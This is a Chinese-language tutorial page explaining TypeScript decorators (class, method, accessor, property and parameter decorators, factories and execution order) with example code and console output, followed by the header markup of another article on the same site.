.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1、装饰器</h2>
<blockquote>
<p>定义：在不修改原代码的情况下，通过注解方式为类、方法、属性或参数添加额外功能的特性</p>
</blockquote>
<h3 data-id="heading-1">1.1调用方式</h3>
<p>以<code>@expression</code>这种形式，<code>expression</code>求值后必须为一个函数，在被调用时会调用表达式表示的函数</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">firstDec</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'firstDec'</span>)
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">secondDec</span> (){
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'secondDec'</span>)
    }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter</span> {
    @firstDec
    <span class="hljs-title function_">firstGreet</span>(<span class="hljs-params">name: string</span>) {
    }
    @<span class="hljs-title function_">secondDec</span>()
    <span class="hljs-title function_">secondGreet</span>(<span class="hljs-params">name: string</span>) {
    }
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter</span>()
<span class="hljs-comment">//firstDec</span>
<span class="hljs-comment">//secondDec</span>
</code></pre>
<h3 data-id="heading-2">1.2装饰器组合</h3>
<p>多个装饰器可以同时应用到一个声明上，多装饰器使用遵循以下规则</p>
<ol>
<li>由上至下依次对装饰器表达式求值。</li>
<li>求值的结果会被当作函数，由下至上依次调用。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 书写在同一行上</span>
@f @g x

<span class="hljs-comment">// 多行使用</span>
@f
@g
x
</code></pre>
<h2 data-id="heading-3">2、装饰器工厂</h2>
<p>装饰器工厂主要的应用场景就是让装饰器接收配置参数，实现动态生成返回。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">color</span>(<span class="hljs-params">value: string</span>) { <span class="hljs-comment">// 这是一个装饰器工厂</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">target</span>) { <span class="hljs-comment">//  这是装饰器</span>
        <span class="hljs-comment">// do something with "target" and "value"...</span>
    }
}
</code></pre>
<h2 data-id="heading-4">3、装饰器执行顺序</h2>
<ol>
<li>参数装饰器会在方法装饰器之前执行，然后方法装饰器，访问符装饰器，或属性装饰器按书写顺序执行，最后应用到每个实例成员。</li>
<li>参数装饰器会在方法装饰器之前执行，然后方法装饰器，访问符装饰器，或属性装饰器按书写顺序执行，最后应用到每个静态成员。</li>
<li>参数装饰器应用到构造函数。</li>
<li>类装饰器应用到类。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ParamDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol | <span class="hljs-literal">undefined</span>, parameterIndex: number</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[参数装饰器] 目标: <span class="hljs-subst">${target?.constructor?.name || <span class="hljs-string">'构造函数'</span>}</span>, 属性: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey || <span class="hljs-string">'constructor'</span>)}</span>, 参数索引: <span class="hljs-subst">${parameterIndex}</span>`</span>);
}

<span class="hljs-comment">// 方法装饰器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">MethodDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[方法装饰器] 目标: <span class="hljs-subst">${target.constructor.name}</span>, 方法: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
    <span class="hljs-keyword">return</span> descriptor;
}

<span class="hljs-comment">// 访问符装饰器（getter/setter）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">AccessorDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[访问符装饰器] 目标: <span class="hljs-subst">${target.constructor.name}</span>, 访问符: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
    <span class="hljs-keyword">return</span> descriptor;
}

<span class="hljs-comment">// 属性装饰器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PropertyDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[属性装饰器] 目标: <span class="hljs-subst">${target.constructor.name}</span>, 属性: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
}

<span class="hljs-comment">// 类装饰器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ClassDecorator</span>(<span class="hljs-params">constructor: <span class="hljs-built_in">Function</span></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[类装饰器] 类名: <span class="hljs-subst">${constructor.name}</span>`</span>);
}

@<span class="hljs-title class_">ClassDecorator</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-comment">// 实例方法（带参数装饰器）</span>
    @<span class="hljs-title class_">MethodDecorator</span>
    <span class="hljs-title function_">instanceMethod</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'执行实例方法'</span>);
    }
    
    <span class="hljs-comment">// 实例属性</span>
    @<span class="hljs-title class_">PropertyDecorator</span>
    <span class="hljs-attr">instanceProperty</span>: string = <span class="hljs-string">'实例属性'</span>;
    
    
    <span class="hljs-comment">// 实例访问符（getter）</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">instanceAccessor</span>(): string {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceProperty</span>;
    }

    <span class="hljs-comment">// 实例访问符（setter）</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">set</span> <span class="hljs-title function_">instanceAccessor</span>(<span class="hljs-params">value: string</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceProperty</span> = value;
    }

    <span class="hljs-comment">// 静态属性</span>
    @<span class="hljs-title class_">PropertyDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-attr">staticProperty</span>: string = <span class="hljs-string">'静态属性'</span>;

    <span class="hljs-comment">// 静态方法（带参数装饰器）</span>
    @<span class="hljs-title class_">MethodDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'执行静态方法'</span>);
    }

    <span class="hljs-comment">// 静态访问符（getter）</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">get</span> <span class="hljs-title function_">staticAccessor</span>(): string {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Example</span>.<span class="hljs-property">staticProperty</span>;
    }

    <span class="hljs-comment">// 静态访问符（setter）</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">set</span> <span class="hljs-title function_">staticAccessor</span>(<span class="hljs-params">value: string</span>) {
        <span class="hljs-title class_">Example</span>.<span class="hljs-property">staticProperty</span> = value;
    }

    <span class="hljs-comment">// 构造函数（带参数装饰器）</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'构造函数执行'</span>);
    }
}

<span class="hljs-keyword">const</span> example = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-string">'test'</span>, <span class="hljs-number">123</span>);
<span class="hljs-comment">//[参数装饰器] 目标: Example, 属性: instanceMethod, 参数索引: 1</span>
<span class="hljs-comment">//[参数装饰器] 目标: Example, 属性: instanceMethod, 参数索引: 0</span>
<span class="hljs-comment">//[方法装饰器] 目标: Example, 方法: instanceMethod</span>
<span class="hljs-comment">//[属性装饰器] 目标: Example, 属性: instanceProperty</span>
<span class="hljs-comment">//[访问符装饰器] 目标: Example, 访问符: instanceAccessor</span>
<span class="hljs-comment">//[访问符装饰器] 目标: Example, 访问符: instanceAccessor</span>
<span class="hljs-comment">//[属性装饰器] 目标: Function, 属性: staticProperty</span>
<span class="hljs-comment">//[参数装饰器] 目标: Function, 属性: staticMethod, 参数索引: 1</span>
<span class="hljs-comment">//[参数装饰器] 目标: Function, 属性: staticMethod, 参数索引: 0</span>
<span class="hljs-comment">//[方法装饰器] 目标: Function, 方法: staticMethod</span>
<span class="hljs-comment">//[访问符装饰器] 目标: Function, 访问符: staticAccessor</span>
<span class="hljs-comment">//[访问符装饰器] 目标: Function, 访问符: staticAccessor</span>
<span class="hljs-comment">//[参数装饰器] 目标: Function, 属性: constructor, 参数索引: 1</span>
<span class="hljs-comment">//[参数装饰器] 目标: Function, 属性: constructor, 参数索引: 0</span>
<span class="hljs-comment">//[类装饰器] 类名: Example</span>
<span class="hljs-comment">//构造函数执行</span>
</code></pre>
<h2 data-id="heading-5">4、装饰器分类</h2>
<h3 data-id="heading-6">4.1类装饰器</h3>
<p>类装饰器在类声明之前被声明（紧靠着类声明）。 类装饰器应用于类构造函数，可以用来监视，修改或替换类定义。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sealed</span>(<span class="hljs-params">constructor: <span class="hljs-built_in">Function</span></span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">seal</span>(constructor);
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">seal</span>(constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
}
@sealed
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter</span> {
    <span class="hljs-attr">greeting</span>: string;
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">message: string</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">greeting</span> = message;
    }
    <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, "</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">greeting</span>;
    }
}
</code></pre>
<p>类装饰器表达式会在运行时当作函数直接调用，类的构造函数作为其唯一的参数。
如果装饰器执行有返回，且是一个函数，则会用这个函数替换构造函数，返回其他类型值会直接报错</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">firstDec</span> (){
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">secondDec</span> (){
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span> (){
    }
}

@firstDec
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter1</span> {
}

@secondDec
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter2</span>{
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter1</span>())
<span class="hljs-comment">//Greeter1 {}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter2</span>())
<span class="hljs-comment">//Test {}</span>
</code></pre>
<h3 data-id="heading-7">4.2方法装饰器</h3>
<p>方法装饰器声明在一个方法的声明之前（紧靠着方法声明）。 它会被应用到方法的 属性描述符上，可以用来监视，修改或者替换方法定义。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ReplaceMethod</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[替换装饰器] 替换方法: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);

    <span class="hljs-comment">// 返回一个新的方法实现</span>
    <span class="hljs-keyword">return</span> {
        ...descriptor,
        <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">...args: any[]</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`方法 <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span> 已被替换！`</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`原始参数:`</span>, args);
            <span class="hljs-keyword">return</span> <span class="hljs-string">`替换后的返回值 - 参数: <span class="hljs-subst">${args.join(<span class="hljs-string">', '</span>)}</span>`</span>;
        }
    };
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example1</span> {
    @<span class="hljs-title class_">ReplaceMethod</span>
    <span class="hljs-title function_">originalMethod</span>(<span class="hljs-attr">name</span>: string, <span class="hljs-attr">age</span>: number): string {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`原始方法: <span class="hljs-subst">${name}</span>, <span class="hljs-subst">${age}</span>`</span>;
    }
}

<span class="hljs-keyword">const</span> ex1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example1</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex1.<span class="hljs-title function_">originalMethod</span>(<span class="hljs-string">'张三'</span>, <span class="hljs-number">25</span>));
<span class="hljs-comment">// 输出: 方法 originalMethod 已被替换！</span>
<span class="hljs-comment">//      原始参数: [ '张三', 25 ]</span>
<span class="hljs-comment">//      替换后的返回值 - 参数: 张三, 25</span>
</code></pre>
<p>方法装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ol>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>成员的名字。</li>
<li>成员的属性描述符。</li>
</ol>
<blockquote>
<p>注意  如果代码输出目标版本小于<code>ES5</code>，<em>Property Descriptor</em>将会是<code>undefined</code>。</p>
</blockquote>
<p>有时你可以用一些其他的技巧，来对原方法进行扩展</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LogMethod</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-keyword">const</span> originalMethod = descriptor.<span class="hljs-property">value</span>; <span class="hljs-comment">// 保存原始方法</span>

    <span class="hljs-comment">// 返回包装后的方法</span>
    <span class="hljs-keyword">return</span> {
        ...descriptor,
        <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">...args: any[]</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[日志] 调用方法: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[日志] 参数:`</span>, args);

            <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
            <span class="hljs-keyword">const</span> result = originalMethod.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); <span class="hljs-comment">// 调用原始方法</span>
            <span class="hljs-keyword">const</span> endTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[日志] 返回值:`</span>, result);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[日志] 执行时间: <span class="hljs-subst">${endTime - startTime}</span>ms`</span>);

            <span class="hljs-keyword">return</span> result;
        }
    };
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example2</span> {
    @<span class="hljs-title class_">LogMethod</span>
    <span class="hljs-title function_">calculate</span>(<span class="hljs-attr">a</span>: number, <span class="hljs-attr">b</span>: number): number {
        <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            sum += i;
        }
        <span class="hljs-keyword">return</span> a + b;
    }
}

<span class="hljs-keyword">const</span> ex2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example2</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex2.<span class="hljs-title function_">calculate</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>));
</code></pre>
<h3 data-id="heading-8">4.3访问装饰器</h3>
<p>访问器装饰器声明在一个访问器的声明之前（紧靠着访问器声明）。 访问器装饰器应用于访问器的 属性描述符并且可以用来监视，修改或替换一个访问器的定义。</p>
<p>方法装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ol>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>成员的名字。</li>
<li>成员的属性描述符。</li>
</ol>
<blockquote>
<p>注意  如果代码输出目标版本小于<code>ES5</code>，<em>Property Descriptor</em>将会是<code>undefined</code>。</p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logAccess</span>(<span class="hljs-params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-keyword">const</span> originalGet = descriptor.<span class="hljs-property">get</span>;
    <span class="hljs-keyword">const</span> originalSet = descriptor.<span class="hljs-property">set</span>;

    <span class="hljs-keyword">if</span> (originalGet) {
        descriptor.<span class="hljs-property">get</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`访问 getter: <span class="hljs-subst">${propertyKey}</span>`</span>);
            <span class="hljs-keyword">return</span> descriptor.<span class="hljs-property">value</span>;
        };
    }

    <span class="hljs-keyword">if</span> (originalSet) {
        descriptor.<span class="hljs-property">set</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">value: any</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`访问 setter: <span class="hljs-subst">${propertyKey}</span>, 值: <span class="hljs-subst">${value}</span>`</span>);
            descriptor.<span class="hljs-property">value</span> = value;
        };
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {

    <span class="hljs-keyword">set</span> <span class="hljs-title function_">val</span>(<span class="hljs-params">value: string</span>) {
    }

    @logAccess
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">val</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span>
    }
}

<span class="hljs-keyword">const</span> ex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();
ex.<span class="hljs-property">val</span> = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex.<span class="hljs-property">val</span>);
<span class="hljs-comment">//访问 setter: val, 值: hello</span>
<span class="hljs-comment">//访问 getter: val</span>
<span class="hljs-comment">//hello</span>
</code></pre>
<h3 data-id="heading-9">4.4属性装饰器</h3>
<p>属性装饰器声明在一个属性声明之前（紧靠着属性声明）。 属性装饰器不能用在声明文件中（.d.ts），或者任何外部上下文（比如 declare的类）里。</p>
<p>属性装饰器表达式会在运行时当作函数被调用，传入下列2个参数：</p>
<ol>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>成员的名字。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 属性装饰器：标记属性为只读</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">readonly</span>(<span class="hljs-params">target: any, propertyKey: string</span>) {
    <span class="hljs-keyword">const</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(target, propertyKey) || {};
    descriptor.<span class="hljs-property">writable</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, propertyKey, descriptor);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    @readonly
    <span class="hljs-attr">name</span>: string = <span class="hljs-string">'张三'</span>;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// 张三</span>
<span class="hljs-comment">// user.name = '李四'; // 错误：无法赋值给只读属性</span>
</code></pre>
<h3 data-id="heading-10">4.5参数装饰器</h3>
<p>参数装饰器声明在一个参数声明之前（紧靠着参数声明）。 参数装饰器应用于类构造函数或方法声明。 参数装饰器不能用在声明文件（.d.ts），重载或其它外部上下文（比如 declare的类）里。</p>
<p>参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ol>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>成员的名字。</li>
<li>参数在函数参数列表中的索引。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logParam</span>(<span class="hljs-params">target: any, propertyKey: string | symbol | <span class="hljs-literal">undefined</span>, parameterIndex: number</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`参数装饰器: 方法 <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span> 的第 <span class="hljs-subst">${parameterIndex}</span> 个参数被标记`</span>);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-title function_">add</span>(@logParam <span class="hljs-attr">a</span>: number, @logParam <span class="hljs-attr">b</span>: number): number {
        <span class="hljs-keyword">return</span> a + b;
    }
}

<span class="hljs-keyword">const</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 8</span>
</code></pre>
<h2 data-id="heading-11">5、原理（TODO）</h2>
<blockquote>
<p>装饰器本质就是语法糖，在编译时转换为普通函数调用而已</p>
</blockquote>
<h2 data-id="heading-12">参考链接</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tslang.cn%2Fdocs%2Fhandbook%2Fdecorators.html" target="_blank" title="https://www.tslang.cn/docs/handbook/decorators.html" ref="nofollow noopener noreferrer">TypeScript中文网</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 AI 全栈项目第五天：用 shadcn/ui 打造高颜值 React 应用 & 实战 Notes 项目]]></title>    <link>https://juejin.cn/post/7596883689827795007</link>    <guid>https://juejin.cn/post/7596883689827795007</guid>    <pubDate>2026-01-19T17:33:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827795007" data-draft-id="7596883689827762239" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 AI 全栈项目第五天：用 shadcn/ui 打造高颜值 React 应用 &amp; 实战 Notes 项目"/> <meta itemprop="keywords" content="TypeScript,React.js,前端框架"/> <meta itemprop="datePublished" content="2026-01-19T17:33:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神秘的猪头"/> <meta itemprop="url" content="https://juejin.cn/user/793223472877051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 AI 全栈项目第五天：用 shadcn/ui 打造高颜值 React 应用 &amp; 实战 Notes 项目
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793223472877051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神秘的猪头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:33:34.000Z" title="Mon Jan 19 2026 17:33:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body 